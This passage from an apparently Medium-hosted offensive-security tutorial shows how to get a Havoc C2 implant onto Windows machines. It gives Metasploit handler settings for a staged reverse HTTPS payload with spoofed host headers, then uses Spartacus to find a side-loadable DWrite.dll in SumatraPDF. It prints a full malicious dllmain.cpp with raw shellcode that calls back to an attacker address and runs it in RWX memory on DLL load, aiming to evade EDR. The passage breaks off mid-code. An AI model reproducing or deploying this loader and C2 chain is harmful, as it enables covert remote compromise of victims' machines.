to enter the SHELLCODE_FILE as our Havoc C2 binary file we generated previously (demon.x64.bin) so we can send our Stage 2 payload after initial connection over meterpreter HTTPS. Here’s the options:</p><ul class=""><li id="d616" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">use multi/handler</li><li id="7239" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set payload windows/x64/custom/reverse_https</li><li id="ae22" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set exitfunc thread</li><li id="34ec" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set lhost &lt;IP ADDR&gt;</li><li id="d6c3" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set lport 8443</li><li id="7ea8" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set luri blog.html</li><li id="e355" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HttpServerName Blogger</li><li id="5023" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set shellcode_file demon.x64.bin</li><li id="1037" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set exitonsession false</li><li id="522e" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HttpHostHeader <a class="ah rn" href="http://www.factbook.com/" rel="noopener ugc nofollow" target="_blank">www.factbook.com</a></li><li id="7458" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">set HandlerSSLCert <a class="ah rn" href="http://www.google.com.pem/" rel="noopener ugc nofollow" target="_blank">www.google.com.pem</a></li></ul><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm ro"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hVVAsx9vnrxHVVTrqDj4iw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*hVVAsx9vnrxHVVTrqDj4iw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*hVVAsx9vnrxHVVTrqDj4iw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*hVVAsx9vnrxHVVTrqDj4iw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*hVVAsx9vnrxHVVTrqDj4iw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*hVVAsx9vnrxHVVTrqDj4iw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*hVVAsx9vnrxHVVTrqDj4iw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*hVVAsx9vnrxHVVTrqDj4iw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="410" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*hVVAsx9vnrxHVVTrqDj4iw.png"></picture></div></div></figure><p id="8add" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Our process for connections looks like this:</p><p id="96a0" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 1) </strong>Victim executes stage 1 payload on disk → stage 2 payload downloaded from port 8443 (Metasploit) on attacker</p><p id="a31e" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 2) </strong>Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) on attacker</p><h2 id="bccc" class="ok ol hl bg om on oo il op oq or io os ot ou ov ow ox oy oz pa pb pc pd pe pf bl" data-selectable-paragraph="">Executing C2 Connection via DLL Proxy Hijacking + Side-Loading</h2><p id="98bd" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">We need to decide how to run our DLL stealthily. There’s plenty of ways to do this with some social engineering of course. What we could do is use rundll32.exe in PowerShell, but this is likely caught by EDR even with an AMSI bypass in PowerShell. What we’re going to do is DLL side-loading with DLL proxying from a normal PE.</p><h3 id="2377" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Determine what PE to use</h3><p id="efa0" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">The first step is to find a vulnerable PE that is preferably signed/trusted and allows side-loading of a DLL meaning the DLL will load with the PE if it has the correct name and is in the same directory as the PE (which is default for 64 bit systems). I’m going to use a Sumatra PDF setup executable. I downloaded the executable here:</p><div class="qi qj qk ql qm qn"><a href="https://www.sumatrapdfreader.org/download-free-pdf-viewer?source=post_page-----733d423fc67b---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qo ac cb"><div class="qp ac cv ci cd qq"><h2 class="bg hm qr ab ga qs qt qu qv qw qx hk bl">Sumatra PDF reader download page</h2><div class="qy m"><h3 class="bg b qr ab ga qs qt qu qv qw qx eb">Download SumatraPDF Portable version is a single executable, can be run from USB drive and doesn't write to registry…</h3></div><div class="qz m"><p class="bg b ec ab ga qs qt qu qv qw qx eb">www.sumatrapdfreader.org</p></div></div><div class="ra m"><div class="xc m rc rd re ra rf mn qn"></div></div></div></a></div><h3 id="0c15" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Find what to name our malicious DLL and the export definitions of the legit DLL</h3><p id="b02f" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">It’s not enough to just put any DLL in the same directory as SumatraPDF.exe because we don’t know the name of the loaded DLL and even if we did, it will break the PE itself which would give us away. DLL proxying is a technique to restore the native DLL execution flow (function calls) so the PE is not corrupted. To find the name of a vulnerable DLL and create our .cpp template we are going to use a tool called Sparticus:</p><div class="qi qj qk ql qm qn"><a href="https://github.com/Accenture/Spartacus?source=post_page-----733d423fc67b---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qo ac cb"><div class="qp ac cv ci cd qq"><h2 class="bg hm qr ab ga qs qt qu qv qw qx hk bl">GitHub - Accenture/Spartacus: Spartacus DLL/COM Hijacking Toolkit</h2><div class="qy m"><h3 class="bg b qr ab ga qs qt qu qv qw qx eb">Spartacus DLL/COM Hijacking Toolkit. Contribute to Accenture/Spartacus development by creating an account on GitHub.</h3></div><div class="qz m"><p class="bg b ec ab ga qs qt qu qv qw qx eb">github.com</p></div></div><div class="ra m"><div class="xd m rc rd re ra rf mn qn"></div></div></div></a></div><p id="cd66" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">On Windows, we run the below command in Powershell and then execute SumatraPDF.exe from anywhere on the system. You’ll also need to download procmon from sysinternals. Sparticus then finds which DLLs are hijackable (multiple, but I chose DWrite.dll), exports their definitions and generates a cpp template that we can open with Visual Studio that won’t break the specific PE when we DLL side-load!</p><blockquote class="ri rj rk"><p id="d14e" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">.\Spartacus.exe — mode dll — procmon .\Procmon.exe — pml C:\Data\logs.pml — csv C:\Data\VulnerableDLLFiles.csv — solution C:\Data\Solutions — verbose</p></blockquote><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Sx8eXyF-cQEh2SCSTD_eJg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Sx8eXyF-cQEh2SCSTD_eJg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Sx8eXyF-cQEh2SCSTD_eJg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Sx8eXyF-cQEh2SCSTD_eJg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Sx8eXyF-cQEh2SCSTD_eJg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Sx8eXyF-cQEh2SCSTD_eJg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Sx8eXyF-cQEh2SCSTD_eJg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Sx8eXyF-cQEh2SCSTD_eJg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="294" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Sx8eXyF-cQEh2SCSTD_eJg.png"></picture></div></div></figure><p id="5747" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The top pragma comments parse the legit DLLs export table and create a C++ header that contains export definitions that the C++ Compile Linker can use to create the new malicious DLL. We can load the Sparticus generated .cpp template below in Visual Studio with our Stage 1 payload Shellcode and build it:</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Bg-LnKVErb8ebUC-uje0fg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Bg-LnKVErb8ebUC-uje0fg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Bg-LnKVErb8ebUC-uje0fg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Bg-LnKVErb8ebUC-uje0fg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Bg-LnKVErb8ebUC-uje0fg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Bg-LnKVErb8ebUC-uje0fg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Bg-LnKVErb8ebUC-uje0fg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Bg-LnKVErb8ebUC-uje0fg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="436" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Bg-LnKVErb8ebUC-uje0fg.png"></picture></div></div></figure><h3 id="74fd" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Build our Malicious DLL (dllmain.cpp) in Visual Studio.</h3></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NHRA5IBhQmgBkyZKyU2YTA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*NHRA5IBhQmgBkyZKyU2YTA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NHRA5IBhQmgBkyZKyU2YTA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NHRA5IBhQmgBkyZKyU2YTA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NHRA5IBhQmgBkyZKyU2YTA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NHRA5IBhQmgBkyZKyU2YTA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NHRA5IBhQmgBkyZKyU2YTA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*NHRA5IBhQmgBkyZKyU2YTA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="114" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*NHRA5IBhQmgBkyZKyU2YTA.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ohDXv6DJ7PHbiUxPwDK6Iw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="509" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ohDXv6DJ7PHbiUxPwDK6Iw.png"></picture></div></div></figure><p id="5c2d" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Make sure the build is for x64 release. Below is the code we used in dllmain.cpp:</p><blockquote class="ri rj rk"><p id="84f6" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">#pragma once</p><p id="2bdb" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">#pragma comment(linker,”/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,<a class="ah rn" href="http://twitter.com/1" rel="noopener ugc nofollow" target="_blank">@1</a>")</p><p id="eaa6" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">#include “windows.h”<br>#include “ios”<br>#include “fstream”</p><p id="5129" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">VOID Payload() {<br> unsigned char shellcode[] =<br> “\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50”<br> “\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56\x48\x8b\x52”<br> “\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f”<br> “\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41”<br> “\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52”<br> “\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f”<br> “\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0”<br> “\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49”<br> “\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88”<br> “\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1”<br> “\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8”<br> “\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44”<br> “\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41”<br> “\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83”<br> “\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9”<br> “\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e”<br> “\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c”<br> “\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31”<br> “\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00”<br> “\x00\x00\xff\xd5\xe8\x09\x00\x00\x00\x31\x30\x2e\x30\x2e”<br> “\x32\x2e\x39\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xfb\x20\x00”<br> “\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f”<br> “\xc6\x00\x00\x00\x00\xff\xd5\xe8\x29\x00\x00\x00\x2f\x62”<br> “\x6c\x6f\x67\x2e\x68\x74\x6d\x6c\x2f\x61\x78\x62\x43\x49”<br> “\x54\x55\x31\x31\x4f\x6f\x69\x31\x79\x50\x56\x52\x32\x61”<br> “\x54\x48\x67\x43\x42\x33\x6a\x76\x50\x43\x00\x48\x89\xc1”<br> “\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84”<br> “\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b”<br> “\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a”<br> “\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59\x49”<br> “\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0”<br> “\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53\x49”<br> “\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x23\x48\xc7”<br> “\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00”<br> “\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\x49\xc7\xc2\xf0”<br> “\xb5\xa2\x56\xff\xd5\x53\x48\x89\xe2\x53\x49\x89\xe1\x6a”<br> “\x04\x41\x58\x48\x89\xf1\x49\xba\x12\x96\x89\xe2\x00\x00”<br> “\x00\x00\xff\xd5\x85\xc0\x74\xd8\x48\x83\xc4\x28\x53\x59”<br> “\x5a\x48\x89\xd3\x6a\x40\x41\x59\x49\xc7\xc0\x00\x10\x00”<br> “\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48”<br> “\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x49\x89\xc0\x48\x89”<br> “\xda\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00”<br> “\xff\xd5\x48\x83\xc4\x20\x85\xc0\x0f\x84\x8c\xff\xff\xff”<br> “\x58\xc3”;</p><p id="9306" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());<br> PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);<br> WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);<br> HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);<br> CloseHandle(processHandle);<br> <br>}</p><p id="00ea" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)<br>{<br> switch (fdwReason)<br> {<br> case DLL_PROCESS_ATTACH:<br> Payload();<br> break;<br> case DLL_THREAD_ATTACH:<br> break;<br> case DLL_THREAD_DETACH:<br> 